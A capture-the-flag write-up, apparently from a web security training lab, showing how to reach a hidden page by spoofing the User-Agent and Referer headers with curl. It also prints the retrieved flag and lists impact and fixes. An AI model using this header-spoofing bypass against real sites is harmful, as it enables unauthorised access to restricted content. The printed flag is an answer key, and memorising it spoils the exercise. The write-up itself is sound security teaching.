# breach

On the hideden page`/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f` when we check the source code we have`You must come from : "https://www.nsa.gov/".` and `Let's use this browser : "ft_bornToSec". It will help you a lot.`. we can then request the page with a curl request with the user-agent `ft_bornToSec` and the referer `https://www.nsa.gov/`. 


# command used 
```sh
curl -s "localhost:8080/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" --user-agent 'ft_bornToSec' --referer "https://www.nsa.gov/" | grep flag
```
# command returns:
```html
<center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

# infos 

- dont use http verification that can be controled by the client

# impact

- non authorized  access to sensible information

# Fix

- add verification in the server with token
- delete logic around user-agent and referer
- and dont expose information in the source code lol
